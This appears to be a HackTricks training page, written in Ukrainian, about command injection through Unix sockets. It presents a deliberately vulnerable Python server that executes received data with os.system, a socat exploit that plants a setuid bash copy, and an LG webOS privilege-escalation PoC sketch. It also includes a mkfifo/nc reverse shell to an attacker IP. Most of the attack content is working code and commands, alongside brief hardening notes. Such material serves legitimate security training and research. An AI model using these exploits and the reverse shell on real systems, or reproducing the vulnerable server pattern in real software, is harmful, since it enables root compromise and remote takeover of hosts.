# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Приклад прив’язування socket за допомогою Python

У наведеному прикладі створюється **unix socket** (`/tmp/socket_test.s`), і все **отримане** передається на виконання через `os.system`. Я знаю, що ви навряд чи знайдете таке у wild, але мета цього прикладу — показати, як виглядає код, що використовує unix sockets, і як обробляти вхідні дані в найгіршому можливому випадку.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Виконайте** код за допомогою `python s.py` і **перевірте, як прослуховується сокет**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Case study: ескалація через root-owned UNIX socket, triggered сигналом (LG webOS)

Деякі привілейовані демони відкривають root-owned UNIX socket, який приймає недовірені вхідні дані та пов’язує привілейовані дії з thread-ID і сигналами. Якщо протокол дає unprivileged client змогу впливати на те, який native thread буде targeted, можна trigger привілейований code path і виконати escalation.

Observed pattern:
- Підключитися до root-owned socket (наприклад, /tmp/remotelogger).
- Створити thread і отримати його native thread id (TID).
- Надіслати TID (у packed-форматі) разом із padding як request; отримати acknowledgement.
- Надіслати specific signal до цього TID, щоб trigger privileged behaviour.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Щоб перетворити це на root shell, можна використати простий шаблон named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Нотатки:
- Цей клас вразливостей виникає через довіру до значень, отриманих зі стану непривілейованого клієнта (TID), і їх прив’язування до привілейованих обробників сигналів або логіки.
- Для hardening слід забезпечити перевірку облікових даних на socket, валідувати формати повідомлень і відокремити привілейовані операції від зовнішніх ідентифікаторів потоків.

## Посилання

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
